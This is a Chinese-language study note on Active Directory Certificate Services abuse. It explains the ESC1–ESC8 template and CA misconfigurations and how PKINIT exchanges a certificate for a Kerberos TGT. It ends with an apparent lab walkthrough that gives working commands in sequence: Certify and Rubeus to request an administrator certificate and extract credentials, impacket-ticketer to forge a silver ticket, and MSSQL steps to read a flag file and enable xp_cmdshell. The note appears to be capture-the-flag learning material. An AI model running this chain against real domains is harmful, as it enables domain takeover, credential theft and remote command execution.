





## Active Directory Certificate Services (AD CS) Abuse/Exploitation（ADCS证书滥用）

## Enrollee Supplies Subject

| 编号 | 名称                          | 一句话理解                         |
| ---- | ----------------------------- | ---------------------------------- |
| ECS1 | 模板允许自填身份              | 普通用户能申请“写着别人名字”的证书 |
| ESC2 | 过宽EKU/用途                  | 证书用途太万能， 拿去验证          |
| ECS3 | Enrollment Agent              | 用“代办证书”帮别人办证             |
| ECS4 | 模板对象权限                  | 你能改模板，把它改成可利用         |
| ECS5 | PKI对象ACL                    | 你能改CA/PKI关键对象               |
| ESC6 | EDIT_ATTRIBUTESUBJECTALTNAME2 | 旧CA配置允许乱写SAN                |
| ESC7 | CA管理权限                    | 能直接控制CA                       |
| ESC8 | Web Enroolment + NTLM         | 通过Web Enrollment + NTLM Relay    |

## 证书权限

| 权限               | 作用对象   | 价值 |
| ------------------ | ---------- | ---- |
| Enroll             | 证书模板   | 1    |
| ManageCertificates | 已签发证书 | 2    |
| ManageCA           | CA本身     | 3    |

## Enroll：申请证书

流程：

1）对ADCS做资产梳理：看有哪些模板、哪些模板允许谁Enroll

2）找到“高风险模板”：

​	（1）模板允许用于身份验证

​	（2）申请者可以自定义Subject/SAN

​	（3）模板权限过宽

3）一旦满足上述条件

​	（1）攻击者可以申请一个“看起来属于高权用户”的证书

​	（2）在域内把自己当成高权使用

4）判断是否可用的标准：

​	（1）Enroll+（可用于认证）+申请者可控身份字段+权限过宽

## ManageCertificates：证书“管理员”风险

流程：

1）组织启用了“证书请求需要人工审批/处于Pending”这类流程

2）攻击者如果拥有ManageCertificates：

​	（1）就可能对挂起的请求进行批准

​	（2）或者对已发证书吊销/影响可用性

3）最危险的组合

​	（1）低权能提交请求

​	（2）再用ManageCertificates把请求“批下来”

​	（3）最终得到可用于认证的证书

##  ManageCA：CA提权（最危险，我能改规则并给任何人发证）

流程：

1）拿到MangeCA的人可以改CA级配置与策略（“发证规则”）

2）典型滥用方向：

​	（1）把CA配成更宽松/更危险（例如允许更自由的身份字段/拓展）

​	（2）调整/发布模板，启用不该启用的能力

​	（3）最终实现“给任意身份签发可用于认证的证书”

3）一旦满足上述

​	（1）域内“身份可信链”基本被接管

​	（2）后续不仅是一次提权，还是持久化能力

4）如何看是否危险

​	（1）看到ManageCA基本按“域沦陷风险处理”

​	（2）即使没有“高危模板”，ManageCA也能让攻击者创造高危条件

## 什么是Certificate Template（证书模板）

在ADCS里，证书不是随便签的，而是必须基于一个模板：

模板决定：

​	（1）谁可以申请（Enroll）

​	（2）证书用途（EKU）

​	（3）能不能用于登录（Client Authentication / Smart Card）

​	（4）身份字段怎么写（Subject/UPN/SAN）

​	（5）是否需要审批

​	（6）密钥的长度，有效期

模板=证书的“规则说明书”

## SubCA是什么？



SubCA是一个非常特殊、非常高权的证书

原本用途：

​	（1）给子证书办法机构（Subordinate CA）申请证书

特点通常包括：

​	（1）高权限EKU

​	（2）强身份声明能力

​	（3）经常不绑定具体用户SID

​	（4）常被配置为管理员/CA使用

它不是给普通用户用的

## 为什么SubCA不需要Client Authentication依然很危险

### 1）Client Authentication是什么？

它是EKU（Extend Key Usage）里一个标记，意思是：

这张证书可以用来做“客户端认证”（比如TLS客户端认证、某些PRINIT/智能卡场景）

它是来约束终端证书（CA=FALSE）的用途

### 2）SubCA为什么不需要它？

因为SubCA证书大多数情况下是CA=TRUE(CA证书)

CA证书在PKI体系中的角色不同：

​	（1）终端证书：用途靠EKU约束

​	（2）CA证书：它是信任链的一环，核心是“签发/背书”

所有就算它没有Client Authentication 它依然：

​	（1）可以被系统当成“高信任实体”

​	（2）可以用来签发其他证书（如果你掌握私钥）

​	（3）可以造成“信息体系被接管”的后果

这就是“核弹级”的原因：它改变的是信任根，不是一次登录能力。

### 3）核弹级风险到底体现在哪里？

A.它能让攻击者“成为一个子CA”

如果攻击者拿到一张SubCA（CA=TRUE）的证书+私钥，理论上具备了：

​	（1）签发新的证书（给任意身份、任意用途）

​	（2）构造一条看起来完全合法的证书链（受信任CA->子CA->伪造证书)

这会把攻击从“冒充一次管理员”升级成“长期、可拓展、可隐藏的证书级持久化

B.它绕开了很多“模板的限制逻辑”

（1）raven没Enroll->自动不签发

（2）但你有签发权（ManageCertificates/ManageCA）->依然能把请求issue

控制“签发/批准”的人，比模板权大。

C.它不一定靠Client Authentication才能用于域身份链路

很多人误认为“PRINIT只看Client Authentication”

实际上，KDC的行为取决于：

​	（1）证书链是否可信

​	（2）证书身份如何映射

​	（3）环境策略如何配置

## 为什么能用证书换取TGT？

因为Kerberos从设计上就允许一种“不用密码也能完成最初登录”的机制：PKINIT

核心思想是：用“证书+私钥”的公钥密码学证明你是谁,KDC（域控）验证照样给你TGT。

这不是漏洞，是Kerberos的标准扩展（智能卡登录就是用它）

### 1）传统Kerberos：用密码证明身份->发TGT

​	正常流程（不用证书）：

​	（1）客户端发AS-REQ给KC：我想要TGT

​	（2）KDC要你证明你是某个用户：用密码派生密钥进行预认证

​	（3）通过后KDC返回AS-REP，里面包含TGT

身份绑定在“你知道密码”上

### 2）PKINIT：用证书证明身份->也发TGT

PKINIT（Public Key Cryptography for Inital Authentication in Kerberos）

​	流程：

​	1）客户端发AS-REQ（带PRINIT扩展）

​		（1）带你上的证书（公开的）

​		（2）再用你的私钥对挑战数据做签名/解密证明“我确实持有私钥”

​	2）KDC做两件事

​		（1）验证证书链：这证书是不是域信任的CA(ADCS)签发的

​		（2）把证书映射到某个AD账号：比如证书的UPN=administrator@domain

​	3）验证通过->KDC回AS-REP->给你TGT

身份绑定在“你持有私钥+证书被域信任”上

### 3）为什么证书能代表“某个用户”

关键在“证书到账号的映射”。KDC会根据证书里的身份字段把它映射到AD用户：

​	1）最常见：UPN（User Principal Name）

​		例如：administrator@domain

​	2）也有其他映射方式

只要映射成功，KDC就会认为

“这个证书对应的就是这个用户”

#### 4）为什么KDC会信任证书？

因为域里配置了信任根：

​	（1）域信任企业CA（ADCS)的根证书链

​	（2）所以KDC看到某证书是从这条链签出来的，就认可它

这和游览器HTTPS网站证书是同一套信任模型

### 5）这机制本来是用来干嘛的？

智能卡登录/证书登录

​	（1）不用口令

​	（2）用智能卡/证书+PIN

​	（3）更安全，更易管控

所以PRINIT是正经功能。

### 6）为什么ADCS攻击里会变成提权

因为如果你能搞到一张“声明为管理员”的认证证书（如UPN写管理员）

​	PRINIT直接把你当管理员

​	直接给你管理员的TGT

所以风险不在于PRINIT，而在：

​	谁能让CA给“错误的身份”签证书，或谁能批准/签发异常请求

## Enroll（Certify）

（1）查询信息

**.**\Certify.exe find /vulnerable /currentuser

（2）申请证书

**.**\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

（3）转换证书格式

openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

（4）注入证书并请求ASKTGT

**.**\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx

（5）

**.**\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap

## 银票

### 计算NTLMHash

import hashlib

hashlib.new('md4','REGGIE1234ronnie'.encode('utf-16le')).digest().hex()

### 获取域SID

Get-ADDomain **|** fl DomainSID

### 银票

#### 产生

impacket-ticketer -nthash <hash> -domian-sid <sid> -spn <spn> <user>

#### 连接

KRB5CCNAME=administrator.ccache impacket-mssqlclient -k <dc>

### 读取标志

SELECT ***** FROM OPENROWSET**(**BULK N'C:\users\ryan.cooper\desktop\user.txt', SINGLE_CLOB**)** AS Contents

### 执行

xp_cmdshell whoami;

EXECUTE sp_configure 'show advanced options',1

RECONFIGURE

EXECUTE sp_configure 'xm_cmdshell',1

RECONFIGURE

xp_cmdshell whoami